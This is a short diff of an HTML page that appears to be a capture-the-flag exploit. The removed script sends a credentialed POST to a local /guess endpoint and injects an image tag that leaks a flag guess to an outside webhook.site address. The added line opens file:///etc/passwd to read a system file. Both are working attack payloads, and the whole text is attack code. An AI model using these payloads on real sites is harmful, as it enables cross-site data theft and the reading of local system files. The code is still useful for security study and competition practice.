@@ -2,20 +2,7 @@
 <html>
 <body>
   <script>
-    (async () => {
-      const params = new URLSearchParams();
-      params.append('guess', 'NHNC{');
-      params.append('note', '<img src="http://webhook.site/84a03765-23d9-4cd6-961b-e43af3653d6a?flag=NHNC{">');
-
-      await fetch('http://127.0.0.1:5000/guess', {
-        method: 'POST',
-        credentials: 'include',
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded'
-        },
-        body: params.toString()
-      });
-    })();
+    window.open("file:///etc/passwd")
   </script>
 </body>
 </html>
